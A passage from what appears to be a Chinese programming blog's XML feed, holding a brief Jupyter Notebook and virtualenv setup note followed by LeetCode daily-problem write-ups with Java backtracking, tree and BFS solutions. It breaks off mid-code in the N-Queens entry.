    <content type="text"><![CDATA[前言 Jupyter Notebook是一个非常好用的交互式笔记写作应用，支持运行 40 多种编程语言。本质上是一个 Web 应用程序，便于创建和共享文学化程序文档，支持实时代码，数学方程，可视化和 markdown。 用途包括：数据清理和转换，数值模拟，统计建模，机器学习等等 这篇文章将介绍windows10操作系统下Jupyter Notebook的基本使用，包括，安装，配置，常用快捷键，常用语法等 安装直接使用命令pip install jupyterlab -i https://mirrors.aliyun.com/pypi/simple 配置使用Jupyter Notebook之前，建议先配置python虚拟环境，参考步骤如下（当然，这是可选的，换言之，你可以不接受这个建议）： 安装，命令pip install virtualenvwrapper-win -i https://mirrors.aliyun.com/pypi/simple 自定义安装的虚拟环境路径（可选），配置环境变量WORKON_HOME指向自定义的目录即可 创建虚拟环境，命令mkvirtualenv env_name 退出虚拟环境，命令deactivate 其他常用命令 12workon 查看所有虚拟环境workon env_name 切入该虚拟环境 装虚拟环境有什么用？其实这就相当于在pycharm里面新建工程一样，便于管理该项目的依赖等 使用 命令行执行jupyter notebook即可自动弹出浏览器界面 摸索中 由于内容太多，不打算继续写下去了，可参考https://www.jianshu.com/p/91365f343585]]></content>
      <categories>
        <category>机器学习</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>Jupyter Notebook</tag>
        <tag>virtualenvwrapper-win</tag>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/9/16]]></title>
    <url>%2Fposts%2F3ca2935a%2F</url>
    <content type="text"><![CDATA[题目：226. 翻转二叉树难度：简单 翻转一棵二叉树。 示例： 1234567891011121314输入： 4 / \ 2 7 / \ / \1 3 6 9输出： 4 / \ 7 2 / \ / \9 6 3 1 备注:这个问题是受到 Max Howell 的 原问题 启发的 ： 谷歌：我们90％的工程师使用您编写的软件(Homebrew)，但是您却无法在面试时在白板上写出翻转二叉树这道题，这太糟糕了。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/invert-binary-tree著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 直接递归即可 解题代码12345678910111213141516171819202122232425/** * Definition for a binary tree node. * public class TreeNode &#123; * int val; * TreeNode left; * TreeNode right; * TreeNode(int x) &#123; val = x; &#125; * &#125; */class Solution &#123; public TreeNode invertTree(TreeNode root) &#123; if (root == null) &#123; return root; &#125; TreeNode left = root.left; TreeNode right = root.right; root.left = right; root.right = left; invertTree(root.left); invertTree(root.right); return root; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>树</tag>
        <tag>二叉树</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/9/15]]></title>
    <url>%2Fposts%2Fa5abc2e0%2F</url>
    <content type="text"><![CDATA[题目：37. 解数独难度：困难 编写一个程序，通过已填充的空格来解决数独问题。 一个数独的解法需遵循如下规则： 数字 1-9 在每一行只能出现一次。 数字 1-9 在每一列只能出现一次。 数字 1-9 在每一个以粗实线分隔的 3x3 宫内只能出现一次。 空白格用 ‘.’ 表示。 一个数独。 答案被标成红色。 Note: 给定的数独序列只包含数字 1-9 和字符 ‘.’ 。 你可以假设给定的数独只有唯一解。 给定数独永远是 9x9 形式的。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/sudoku-solver著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 搜索每一个可以填的格子，然后利用回溯法尝试，直到找到解 解题代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172class Solution &#123; public void solveSudoku(char[][] board) &#123; List&lt;int[]&gt; space = new ArrayList&lt;&gt;(); for (int i = 0;i &lt; board.length;i++) &#123; for (int j = 0;j &lt; board[i].length;j++) &#123; if (board[i][j] == '.') &#123; space.add(new int[] &#123;i,j&#125;); &#125; &#125; &#125; dfs(board,space,0); for (int i = 0;i &lt; ans.length;i++) &#123; board[i] = Arrays.copyOf(ans[i],ans[i].length); &#125; &#125; char[][] ans = new char[9][9]; private void dfs(char[][] board,List&lt;int[]&gt; space,int pos) &#123; if (pos == space.size()) &#123; for (int i = 0;i &lt; board.length;i++) &#123; ans[i] = Arrays.copyOf(board[i],board[i].length); &#125; return; &#125; int arr[] = space.get(pos); int x = arr[0]; int y = arr[1]; for (int k = 1;k &lt; 10;k++) &#123; if (canPlace(board,x,y,k)) &#123; board[x][y] = (char) ('0' + k); dfs(board,space,pos + 1); board[x][y] = '.'; &#125; &#125; &#125; private boolean canPlace(char[][] board,int x,int y,int k) &#123; if (board[x][y] != '.') &#123; return false; &#125; for (int i = 0;i &lt; 9;i++) &#123; // 检查行 if (board[x][i] - '0' == k) &#123; return false; &#125; // 检查列 if (board[i][y] - '0' == k) &#123; return false; &#125; &#125; // 检查九宫 int startX = x / 3 * 3; int startY = y / 3 * 3; for (int i = startX;i &lt; startX + 3;i++) &#123; for (int j = startY;j &lt; startY + 3;j++) &#123; if (board[i][j] - '0' == k) &#123; return false; &#125; &#125; &#125; return true; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>回溯算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/9/14]]></title>
    <url>%2Fposts%2Fd2acf276%2F</url>
    <content type="text"><![CDATA[题目：94. 二叉树的中序遍历难度：中等 给定一个二叉树，返回它的中序 遍历。 示例: 12345678输入: [1,null,2,3] 1 \ 2 / 3输出: [1,3,2] 进阶: 递归算法很简单，你可以通过迭代算法完成吗？ 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/binary-tree-inorder-traversal著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 递归或者迭代，中序遍历二叉树即可 解题代码递归 123456789101112131415161718192021222324252627/** * Definition for a binary tree node. * public class TreeNode &#123; * int val; * TreeNode left; * TreeNode right; * TreeNode(int x) &#123; val = x; &#125; * &#125; */class Solution &#123; public List&lt;Integer&gt; inorderTraversal(TreeNode root) &#123; dfs(root); return ans; &#125; List&lt;Integer&gt; ans = new ArrayList&lt;&gt;(); private void dfs(TreeNode root) &#123; if (root == null) &#123; return; &#125; dfs(root.left); ans.add(root.val); dfs(root.right); &#125;&#125; 迭代 123456789101112131415161718192021222324252627/** * Definition for a binary tree node. * public class TreeNode &#123; * int val; * TreeNode left; * TreeNode right; * TreeNode(int x) &#123; val = x; &#125; * &#125; */class Solution &#123; public List&lt;Integer&gt; inorderTraversal(TreeNode root) &#123; Stack&lt;TreeNode&gt; s = new Stack&lt;&gt;(); List&lt;Integer&gt; ans = new ArrayList&lt;&gt;(); while (root != null || !s.isEmpty()) &#123; while (root != null) &#123; s.push(root); root = root.left; &#125; root = s.pop(); ans.add(root.val); root = root.right; &#125; return ans; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>树</tag>
        <tag>二叉树</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/9/13]]></title>
    <url>%2Fposts%2F7d6e9ee2%2F</url>
    <content type="text"><![CDATA[题目：79. 单词搜索难度：中等 给定一个二维网格和一个单词，找出该单词是否存在于网格中。 单词必须按照字母顺序，通过相邻的单元格内的字母构成，其中“相邻”单元格是那些水平相邻或垂直相邻的单元格。同一个单元格内的字母不允许被重复使用。 示例: 12345678910board =[ [&apos;A&apos;,&apos;B&apos;,&apos;C&apos;,&apos;E&apos;], [&apos;S&apos;,&apos;F&apos;,&apos;C&apos;,&apos;S&apos;], [&apos;A&apos;,&apos;D&apos;,&apos;E&apos;,&apos;E&apos;]]给定 word = &quot;ABCCED&quot;, 返回 true给定 word = &quot;SEE&quot;, 返回 true给定 word = &quot;ABCB&quot;, 返回 false 提示： board 和 word 中只包含大写和小写英文字母。 1 &lt;= board.length &lt;= 200 1 &lt;= board[i].length &lt;= 200 1 &lt;= word.length &lt;= 10^3 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/word-search著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 先找到首字符在网格中出现的位置，然后使用回溯法搜索相邻的单元格 解题代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253class Solution &#123; public boolean exist(char[][] board, String word) &#123; if (word.length() &lt; 1) &#123; return false; &#125; boolean[][] used = new boolean[board.length][board[0].length]; for (int i = 0;i &lt; board.length;i++) &#123; for (int j = 0;j &lt; board[i].length;j++) &#123; char ch = word.charAt(0); if (board[i][j] == ch) &#123; if (word.length() == 1) &#123; return true; &#125; // System.out.println(i+","+j); if (dfs(board,used,i,j,word,1)) &#123; return true; &#125; &#125; &#125; &#125; return false; &#125; int dir[][] = new int[][]&#123; &#123;0,-1&#125;, &#123;0,1&#125;, &#123;-1,0&#125;, &#123;1,0&#125; &#125;; private boolean dfs(char[][] board,boolean[][] used,int x,int y,String word,int c) &#123; used[x][y] = true; if (c &gt;= word.length()) &#123; return true; &#125; char ch = word.charAt(c); for (int i = 0;i &lt; dir.length;i++) &#123; int nextX = x + dir[i][0]; int nextY = y + dir[i][1]; // System.out.println(nextX+","+nextY+","+board[x].length); if (nextX &gt;= 0 &amp;&amp; nextX &lt; board.length &amp;&amp; nextY &gt;= 0 &amp;&amp; nextY &lt; board[x].length &amp;&amp; !used[nextX][nextY] &amp;&amp; ch == board[nextX][nextY]) &#123; if (dfs(board,used,nextX,nextY,word,c + 1)) &#123; return true; &#125; &#125; &#125; used[x][y] = false; return false; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>回溯算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/9/12]]></title>
    <url>%2Fposts%2F3bcf5743%2F</url>
    <content type="text"><![CDATA[题目：637. 二叉树的层平均值难度：简单 给定一个非空二叉树, 返回一个由每层节点平均值组成的数组。 示例 1： 123456789输入： 3 / \ 9 20 / \ 15 7输出：[3, 14.5, 11]解释：第 0 层的平均值是 3 , 第1层是 14.5 , 第2层是 11 。因此返回 [3, 14.5, 11] 。 提示： 节点值的范围在32位有符号整数范围内。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/average-of-levels-in-binary-tree著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 使用bfs层序遍历二叉树即可 解题代码12345678910111213141516171819202122232425262728293031323334/** * Definition for a binary tree node. * public class TreeNode &#123; * int val; * TreeNode left; * TreeNode right; * TreeNode(int x) &#123; val = x; &#125; * &#125; */class Solution &#123; public List&lt;Double&gt; averageOfLevels(TreeNode root) &#123; List&lt;Double&gt; ans = new ArrayList&lt;&gt;(); Queue&lt;TreeNode&gt; q = new LinkedList&lt;&gt;(); q.add(root); while (!q.isEmpty()) &#123; int size = q.size(); int cnt = size; double sum = 0.0d; while (size-- &gt; 0) &#123; TreeNode poll = q.poll(); sum += poll.val; if (poll.left != null) &#123; q.add(poll.left); &#125; if (poll.right != null) &#123; q.add(poll.right); &#125; &#125; ans.add(sum / cnt); &#125; return ans; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>树</tag>
        <tag>二叉树</tag>
        <tag>广度优先搜索</tag>
        <tag>bfs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/9/11]]></title>
    <url>%2Fposts%2Fa2c606f9%2F</url>
    <content type="text"><![CDATA[题目：216. 组合总和 III难度：中等 找出所有相加之和为 n 的 k 个数的组合。组合中只允许含有 1 - 9 的正整数，并且每种组合中不存在重复的数字。 说明： 所有数字都是正整数。 解集不能包含重复的组合。 示例 1: 12输入: k = 3, n = 7输出: [[1,2,4]] 示例 2: 12输入: k = 3, n = 9输出: [[1,2,6], [1,3,5], [2,3,4]] 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/combination-sum-iii著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 还是直接使用回溯法搜索即可 解题代码123456789101112131415161718192021222324252627282930313233343536373839404142class Solution &#123; public List&lt;List&lt;Integer&gt;&gt; combinationSum3(int k, int n) &#123; int nums[] = new int[9]; for (int i = 0;i &lt; 9;i++) &#123; nums[i] = i + 1; &#125; boolean used[] = new boolean[9]; List&lt;List&lt;Integer&gt;&gt; ans = new ArrayList&lt;&gt;(); dfs(nums,used,0,k,n,new ArrayList&lt;&gt;(),ans); return ans; &#125; private void dfs(int[] nums,boolean[] used,int c,int k,int n,List&lt;Integer&gt; tmp,List&lt;List&lt;Integer&gt;&gt; ans) &#123; if (k == 0) &#123; int sum = 0; for (int i : tmp) &#123; sum += i; &#125; if (sum == n) &#123; List&lt;Integer&gt; one = new ArrayList&lt;&gt;(tmp); Collections.sort(one); if (!ans.contains(one)) &#123; ans.add(one); &#125; &#125; return; &#125; for (int i = c;i &lt; nums.length;i++) &#123; if (!used[i]) &#123; used[i] = true; tmp.add(nums[i]); dfs(nums,used,c + 1,k - 1,n,tmp,ans); used[i] = false; tmp.remove(tmp.size() - 1); &#125; &#125; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>回溯算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/9/10]]></title>
    <url>%2Fposts%2Fd5c1366f%2F</url>
    <content type="text"><![CDATA[题目：40. 组合总和 II难度：中等 给定一个数组 candidates 和一个目标数 target ，找出 candidates 中所有可以使数字和为 target 的组合。 candidates 中的每个数字在每个组合中只能使用一次。 说明： 所有数字（包括目标数）都是正整数。 解集不能包含重复的组合。 示例 1: 12345678输入: candidates = [10,1,2,7,6,1,5], target = 8,所求解集为:[ [1, 7], [1, 2, 5], [2, 6], [1, 1, 6]] 示例 2: 123456输入: candidates = [2,5,2,1,2], target = 5,所求解集为:[ [1,2,2], [5]] 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/combination-sum-ii著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 在昨天的每日一题基础上，加入了数字不能重复使用这个限制，但本质上没啥改变，还是直接使用回溯法搜索即可 解题代码1234567891011121314151617181920212223242526272829303132333435363738class Solution &#123; public List&lt;List&lt;Integer&gt;&gt; combinationSum2(int[] candidates, int target) &#123; List&lt;List&lt;Integer&gt;&gt; ans = new ArrayList&lt;&gt;(); boolean used[] = new boolean[candidates.length]; dfs(candidates,0,target,new ArrayList&lt;&gt;(),ans,used); return ans; &#125; private void dfs(int[] candidates,int c,int target,List&lt;Integer&gt; tmp,List&lt;List&lt;Integer&gt;&gt; ans,boolean used[]) &#123; int sum = 0; for (int i : tmp) &#123; sum += i; if (sum &gt; target) &#123; return; &#125; &#125; if (sum == target) &#123; List&lt;Integer&gt; one = new ArrayList&lt;&gt;(tmp); Collections.sort(one); if (!ans.contains(one)) &#123; ans.add(one); &#125; return; &#125; for (int i = c;i &lt; candidates.length;i++) &#123; if (!used[i] &amp;&amp; sum + candidates[i] &lt;= target) &#123; used[i] = true; tmp.add(candidates[i]); dfs(candidates,c+1,target,tmp,ans,used); tmp.remove(tmp.size() - 1); used[i] = false; &#125; &#125; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>回溯算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/9/9]]></title>
    <url>%2Fposts%2Fa0c67306%2F</url>
    <content type="text"><![CDATA[题目：39. 组合总和难度：中等 给定一个无重复元素的数组 candidates 和一个目标数 target ，找出 candidates 中所有可以使数字和为 target 的组合。 candidates 中的数字可以无限制重复被选取。 说明： 所有数字（包括 target）都是正整数。 解集不能包含重复的组合。 示例 1： 123456输入：candidates = [2,3,6,7], target = 7,所求解集为：[ [7], [2,2,3]] 示例 2： 1234567输入：candidates = [2,3,5], target = 8,所求解集为：[ [2,2,2,2], [2,3,3], [3,5]] 提示： 1 &lt;= candidates.length &lt;= 30 1 &lt;= candidates[i] &lt;= 200 candidate 中的每个元素都是独一无二的。 1 &lt;= target &lt;= 500 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/combination-sum著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 使用回溯法搜索即可 解题代码123456789101112131415161718192021222324252627282930313233343536class Solution &#123; public List&lt;List&lt;Integer&gt;&gt; combinationSum(int[] candidates, int target) &#123; List&lt;List&lt;Integer&gt;&gt; ans = new ArrayList&lt;&gt;(); dfs(candidates,0,target,new ArrayList&lt;&gt;(),ans); return ans; &#125; private void dfs(int[] candidates,int c,int target,List&lt;Integer&gt; tmp,List&lt;List&lt;Integer&gt;&gt; ans) &#123; int sum = 0; for (int i : tmp) &#123; sum += i; if (sum &gt; target) &#123; return; &#125; &#125; if (sum == target) &#123; List&lt;Integer&gt; one = new ArrayList&lt;&gt;(tmp); Collections.sort(one); if (!ans.contains(one)) &#123; ans.add(one); &#125; return; &#125; for (int i = 0;i &lt; candidates.length;i++) &#123; if (sum + candidates[i] &lt;= target) &#123; tmp.add(candidates[i]); dfs(candidates,0,target,tmp,ans); tmp.remove(tmp.size() - 1); &#125; &#125; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>回溯算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/9/8]]></title>
    <url>%2Fposts%2Fd7c14390%2F</url>
    <content type="text"><![CDATA[题目：77. 组合难度：中等 给定两个整数 n 和 k，返回 1 … n 中所有可能的 k 个数的组合。 示例: 12345678910输入: n = 4, k = 2输出:[ [2,4], [3,4], [2,3], [1,2], [1,3], [1,4],] 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/combinations著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 排列组合问题一般都可以使用回溯法解决 解题代码123456789101112131415161718192021222324252627class Solution &#123; public List&lt;List&lt;Integer&gt;&gt; combine(int n, int k) &#123; int[] nums = new int[n]; for (int i = 0;i &lt; n;i++) &#123; nums[i] = i + 1; &#125; List&lt;List&lt;Integer&gt;&gt; ans = new ArrayList&lt;&gt;(); dfs(nums,0,k,ans,new ArrayList&lt;&gt;()); return ans; &#125; private void dfs(int[] nums,int c,int k,List&lt;List&lt;Integer&gt;&gt; ans,List&lt;Integer&gt; tmp) &#123; if (tmp.size() == k) &#123; ans.add(new ArrayList&lt;&gt;(tmp)); return; &#125; for (int i = c;i &lt; nums.length;i++) &#123; tmp.add(nums[i]); dfs(nums,i + 1,k,ans,tmp); tmp.remove(tmp.size() - 1); &#125; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>回溯算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/9/7]]></title>
    <url>%2Fposts%2F477e5e01%2F</url>
    <content type="text"><![CDATA[题目：347. 前 K 个高频元素难度：中等 给定一个非空的整数数组，返回其中出现频率前 k 高的元素。 示例 1: 12输入: nums = [1,1,1,2,2,3], k = 2输出: [1,2] 示例 2: 12输入: nums = [1], k = 1输出: [1] 提示： 你可以假设给定的 k 总是合理的，且 1 ≤ k ≤ 数组中不相同的元素的个数。 你的算法的时间复杂度必须优于 O(n log n) , n 是数组的大小。 题目数据保证答案唯一，换句话说，数组中前 k 个高频元素的集合是唯一的。 你可以按任意顺序返回答案。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/top-k-frequent-elements著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 暴力 解题代码123456789101112131415161718192021222324252627282930313233class Solution &#123; public int[] topKFrequent(int[] nums, int k) &#123; int ans[] = new int[k]; Map&lt;Integer,Integer&gt; map = new HashMap&lt;&gt;(); for (int i = 0;i &lt; nums.length;i++) &#123; int key = nums[i]; if (map.containsKey(key)) &#123; map.put(key,map.get(key) + 1); &#125; else &#123; map.put(key,1); &#125; &#125; List&lt;Integer&gt; values = new ArrayList&lt;&gt;(map.values()); Collections.sort(values); // System.out.println(values); int index = 0; while (k-- &gt; 0) &#123; for (int key : map.keySet()) &#123; if (map.get(key) == values.get(values.size() - 1 - index)) &#123; ans[index] = key; map.remove(key); break; &#125; &#125; index++; &#125; return ans; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>哈希表</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/9/6]]></title>
    <url>%2Fposts%2F30796e97%2F</url>
    <content type="text"><![CDATA[题目：107. 二叉树的层次遍历 II难度：简单 给定一个二叉树，返回其节点值自底向上的层次遍历。 （即按从叶子节点所在层到根节点所在的层，逐层从左向右遍历） 例如： 给定二叉树 [3,9,20,null,null,15,7], 12345 3 / \9 20 / \ 15 7 返回其自底向上的层次遍历为： 12345[ [15,7], [9,20], [3]] 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/binary-tree-level-order-traversal-ii著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 使用bfs按层序遍历二叉树后翻转即可 解题代码1234567891011121314151617181920212223242526272829303132333435363738394041/** * Definition for a binary tree node. * public class TreeNode &#123; * int val; * TreeNode left; * TreeNode right; * TreeNode(int x) &#123; val = x; &#125; * &#125; */class Solution &#123; public List&lt;List&lt;Integer&gt;&gt; levelOrderBottom(TreeNode root) &#123; List&lt;List&lt;Integer&gt;&gt; ans = new ArrayList&lt;&gt;(); if (root == null) &#123; return ans; &#125; Queue&lt;TreeNode&gt; q = new LinkedList&lt;&gt;(); q.add(root); while (!q.isEmpty()) &#123; int size = q.size(); List&lt;Integer&gt; o = new ArrayList&lt;&gt;(); while (size-- &gt; 0) &#123; TreeNode p = q.poll(); o.add(p.val); if (p.left != null) &#123; q.add(p.left); &#125; if (p.right != null) &#123; q.add(p.right); &#125; &#125; ans.add(o); &#125; Collections.reverse(ans); return ans; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>树</tag>
        <tag>二叉树</tag>
        <tag>广度优先搜索</tag>
        <tag>bfs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/9/5]]></title>
    <url>%2Fposts%2Fa9703f2d%2F</url>
    <content type="text"><![CDATA[题目：60. 第k个排列难度：中等 给出集合 [1,2,3,…,n]，其所有元素共有 n! 种排列。 按大小顺序列出所有排列情况，并一一标记，当 n = 3 时, 所有排列如下： “123” “132” “213” “231” “312” “321” 给定 n 和 k，返回第 k 个排列。 说明： 给定 n 的范围是 [1, 9]。 给定 k 的范围是[1, n!]。 示例 1: 12输入: n = 3, k = 3输出: &quot;213&quot; 示例 2: 12输入: n = 4, k = 9输出: &quot;2314&quot; 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/permutation-sequence著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 直接使用回溯法，按字典序搜索到第k个排列即可 解题代码123456789101112131415161718192021222324252627282930313233343536class Solution &#123; public String getPermutation(int n, int k) &#123; int arr[] = new int[n]; boolean[] used = new boolean[n]; this.k = k; generateP(arr, used, 0); return cache.get(k - 1); &#125; List&lt;String&gt; cache = new ArrayList&lt;&gt;(); int k; private void generateP(int[] curP, boolean[] hashT, int index) &#123; if (cache.size() &gt;= k) &#123; return; &#125; int n = curP.length; if (index == n) &#123; StringBuilder builder = new StringBuilder(); for (int i = 0; i &lt; n; i++) &#123; builder.append(curP[i]); &#125; cache.add(builder.toString()); return; &#125; for (int i = 1; i &lt;= n; i++) &#123; if (hashT[i - 1] == false) &#123; curP[index] = i; hashT[i - 1] = true; generateP(curP, hashT, index + 1); hashT[i - 1] = false; &#125; &#125; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>回溯算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/9/4]]></title>
    <url>%2Fposts%2Fde770fbb%2F</url>
    <content type="text"><![CDATA[题目：257. 二叉树的所有路径难度：简单 给定一个二叉树，返回所有从根节点到叶子节点的路径。 说明: 叶子节点是指没有子节点的节点。 示例: 1234567891011输入: 1 / \2 3 \ 5输出: [&quot;1-&gt;2-&gt;5&quot;, &quot;1-&gt;3&quot;]解释: 所有根节点到叶子节点的路径为: 1-&gt;2-&gt;5, 1-&gt;3 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/binary-tree-paths著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 二叉树相关问题，几乎都是天然的递归问题，直接dfs搜索即可 解题代码123456789101112131415161718192021222324252627282930/** * Definition for a binary tree node. * public class TreeNode &#123; * int val; * TreeNode left; * TreeNode right; * TreeNode(int x) &#123; val = x; &#125; * &#125; */class Solution &#123; public List&lt;String&gt; binaryTreePaths(TreeNode root) &#123; dfs(root,""); return ans; &#125; List&lt;String&gt; ans = new ArrayList&lt;&gt;(); private void dfs(TreeNode root,String s) &#123; if (root == null) &#123; return; &#125; s += root.val; if (root.left == null &amp;&amp; root.right == null) &#123; ans.add(s); &#125; s += "-&gt;"; dfs(root.left,s); dfs(root.right,s); &#125;&#125; 回溯 1234567891011121314151617181920212223242526272829303132/** * Definition for a binary tree node. * public class TreeNode &#123; * int val; * TreeNode left; * TreeNode right; * TreeNode(int x) &#123; val = x; &#125; * &#125; */class Solution &#123; public List&lt;String&gt; binaryTreePaths(TreeNode root) &#123; dfs(root,new StringBuilder()); return ans; &#125; List&lt;String&gt; ans = new ArrayList&lt;&gt;(); private void dfs(TreeNode root,StringBuilder s) &#123; if (root == null) &#123; return; &#125; int len = s.length(); s.append(root.val); if (root.left == null &amp;&amp; root.right == null) &#123; ans.add(s.toString()); &#125; s.append("-&gt;"); dfs(root.left,s); dfs(root.right,s); s.setLength(len); &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>深度优先搜索</tag>
        <tag>dfs</tag>
        <tag>树</tag>
        <tag>二叉树</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/9/3]]></title>
    <url>%2Fposts%2F40139a18%2F</url>
    <content type="text"><![CDATA[题目：51. N 皇后难度：困难 n 皇后问题研究的是如何将 n 个皇后放置在 n×n 的棋盘上，并且使皇后彼此之间不能相互攻击。 上图为 8 皇后问题的一种解法。 给定一个整数 n，返回所有不同的 n 皇后问题的解决方案。 每一种解法包含一个明确的 n 皇后问题的棋子放置方案，该方案中 ‘Q’ 和 ‘.’ 分别代表了皇后和空位。 示例： 12345678910111213输入：4输出：[ [&quot;.Q..&quot;, // 解法 1 &quot;...Q&quot;, &quot;Q...&quot;, &quot;..Q.&quot;], [&quot;..Q.&quot;, // 解法 2 &quot;Q...&quot;, &quot;...Q&quot;, &quot;.Q..&quot;]]解释: 4 皇后问题存在两个不同的解法。 提示： 皇后彼此不能相互攻击，也就是说：任何两个皇后都不能处于同一条横行、纵行或斜线上。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/n-queens著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 n皇后问题，经典的回溯问题，类似于数独问题，核心思路就是枚举每一个可以放置皇后的位置，每次递归都尝试在某一行找到一个列，斜线都没有皇后的位置放入一个皇后，然后进入下一次尝试（下一行） 解题代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263class Solution &#123; List&lt;List&lt;String&gt;&gt; ans; int q[]; public List&lt;List&lt;String&gt;&gt; solveNQueens(int n) &#123; q = new int[n + 1]; ans = new ArrayList&lt;&gt;(); dfs(1, n); return ans; &#125; private boolean place(int i,int j) &#123; if (i == 1) &#123; return true; &#125; int k = 1; while (k &lt; i) &#123; if ((q[k] == j) || (Math.abs(q[k] - j) == Math.abs(i - k))) &#123; return false; &#125; k++; &#125; return true; &#125; private void displaySolution(int n) &#123; for (int i = 1; i &lt;= n; i++) &#123; System.out.printf("(%d,%d) ", i, q[i]); &#125; System.out.println(); &#125; private void dfs(int i,int n) &#123; if (i &gt; n) &#123; //displaySolution(n); List&lt;String&gt; oneAns = new ArrayList&lt;&gt;(); StringBuilder builder = new StringBuilder(); for (int j = 0; j &lt; n; j++) &#123; builder.append('.'); &#125; for (int j = 1; j &lt;= n; j++) &#123; builder.setCharAt(q[j] - 1, 'Q'); oneAns.add(builder.toString()); builder.setCharAt(q[j] - 1, '.'); &#125; ans.add(oneAns); &#125; else &#123; for (int j = 1; j &lt;= n; j++) 